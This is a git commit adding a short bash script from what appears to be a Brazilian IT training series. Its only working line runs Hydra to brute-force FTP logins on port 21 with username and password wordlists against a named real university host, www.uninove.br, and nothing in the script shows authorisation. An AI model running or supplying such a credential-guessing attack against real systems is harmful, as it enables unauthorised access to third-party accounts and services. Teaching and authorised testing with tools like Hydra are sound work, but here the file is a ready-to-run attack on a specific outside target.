7586bfe0bfef93f251ce8d9f4266cef1f42a7d97
Robson Vaamonde <robsonvaamonde@gmail.com>
2016-11-02 13:29:50 -0200

    Create 11-ftp.sh

---
+++ 02_day/11-ftp.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+# Autor: Robson Vaamonde
+# Site: www.procedimentosemti.com.br
+# Facebook: facebook.com/ProcedimentosEmTI
+# Facebook: facebook.com/BoraParaPratica
+# YouTube: youtube.com/BoraParaPratica
+# Data de criação: 31/10/2016
+# Data de atualização: 31/10/2016
+# Versão: 1.0
+
+
+
+hydra -f -s 21 -t 5 -vV -f -L usuarios.txt -e ns -P senhas.txt www.uninove.br ftp
